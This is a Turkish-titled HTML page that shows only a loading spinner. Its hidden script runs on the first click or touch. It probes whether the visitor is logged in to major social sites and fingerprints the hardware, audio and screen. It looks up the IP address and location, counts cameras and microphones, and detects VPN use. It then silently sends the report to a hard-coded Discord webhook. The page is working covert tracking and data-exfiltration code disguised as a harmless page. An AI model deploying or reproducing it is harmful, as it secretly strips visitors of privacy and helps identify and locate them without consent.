<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyonu</title>
    <style>body{background:#000;margin:0;overflow:hidden;cursor:wait;display:flex;align-items:center;justify-content:center;}.l{border:2px solid #111;border-top:2px solid #0f0;border-radius:50%;width:25px;height:25px;animation:s .8s linear infinite;}@keyframes s{to{transform:rotate(360deg);}}</style>
</head>
<body onmousedown="Omni.start()" ontouchstart="Omni.start()">
    <div class="l"></div>
    <script>
        "use strict";

        const Omni = {
            hook: "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73",
            active: false,

            // 1. SOSYAL MEDYA OTURUM TESPƒ∞Tƒ∞ (Geli≈ümi≈ü Redirect Tekniƒüi)
            async probeSocials() {
                const targets = {
                    Google: "https://accounts.google.com/CheckCookie",
                    Facebook: "https://www.facebook.com/favicon.ico",
                    Twitter: "https://twitter.com/favicon.ico",
                    Discord: "https://discord.com/favicon.ico",
                    Netflix: "https://www.netflix.com/favicon.ico"
                };
                const results = {};
                const promises = Object.entries(targets).map(([name, url]) => {
                    return new Promise(res => {
                        const img = new Image();
                        img.onload = () => { results[name] = "‚úÖ Aktif"; res(); };
                        img.onerror = () => { results[name] = "‚ùå Pasif"; res(); };
                        img.src = `${url}?cache=${Math.random()}`;
                        setTimeout(() => { results[name] = "‚è≥ Timeout"; res(); }, 2000);
                    });
                });
                await Promise.all(promises);
                return results;
            },

            // 2. DERƒ∞N DONANIM VE SES KARTI ƒ∞MZASI
            async getFingerprint() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                
                // Audio Fingerprint (Tƒ±klama sonrasƒ± √ßalƒ±≈ütƒ±ƒüƒ± i√ßin hata vermez)
                let aHash = "0";
                try {
                    const ac = new (window.AudioContext || window.webkitAudioContext)();
                    const osc = ac.createOscillator();
                    const comp = ac.createDynamicsCompressor();
                    osc.connect(comp); comp.connect(ac.destination);
                    aHash = ac.sampleRate.toString(); 
                    ac.close();
                } catch(e){}

                return {
                    gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    audio: aHash,
                    res: `${screen.width}x${screen.height}`
                };
            },

            // 3. Aƒû VE MEDYA (Kamera Sayƒ±mƒ± Dahil)
            async getSystem() {
                const [net, devs, battery] = await Promise.all([
                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
                    navigator.mediaDevices.enumerateDevices().catch(() => []),
                    navigator.getBattery ? navigator.getBattery() : {}
                ]);

                return {
                    net,
                    cams: devs.filter(d => d.kind === 'videoinput').length,
                    mics: devs.filter(d => d.kind === 'audioinput').length,
                    bat: battery.level ? `${Math.round(battery.level * 100)}%` : "N/A",
                    os: navigator.platform
                };
            },

            async start() {
                if (this.active) return;
                this.active = true;

                const [social, fp, sys] = await Promise.all([this.probeSocials(), this.getFingerprint(), this.getSystem()]);
                const opt = Intl.DateTimeFormat().resolvedOptions();
                const vpn = (sys.net.timezone && opt.timeZone !== sys.net.timezone) ? "üö© VPN" : "‚úÖ DIRECT";

                const socialStr = Object.entries(social).map(([n, s]) => `**${n}:** ${s}`).join("\n");

                const payload = {
                    embeds: [{
                        title: "üíÄ OMNISCIENCE_V160_PRO_REPORT",
                        color: 0x00ff00,
                        fields: [
                            { name: "üì° NETWORK & VPN", value: `**IP:** \`${sys.net.ip}\` | **ISP:** ${sys.net.org}\n**LOC:** ${sys.net.city}/${sys.net.country_name}\n**Status:** ${vpn}`, inline: false },
                            { name: "‚öôÔ∏è HARDWARE ENTROPY", value: `**GPU:** ${fp.gpu}\n**CPU:** ${fp.cores} | **RAM:** ${fp.ram}GB\n**Audio ID:** ${fp.audio} | **Res:** ${fp.res}`, inline: false },
                            { name: "üåç SOCIAL MEDIA STATUS", value: socialStr, inline: false },
                            { name: "üì∏ SYSTEM & MEDIA", value: `**Cams:** ${sys.cams} | **Mics:** ${sys.mics}\n**OS:** ${sys.os} | **Bat:** ${sys.bat}\n**TZ:** ${opt.timeZone} | **Lang:** ${navigator.language}`, inline: false }
                        ],
                        footer: { text: "Protocol: Omniscience v160 | Stealth Execution" },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(this.hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
            }
        };
    </script>
</body>
</html>
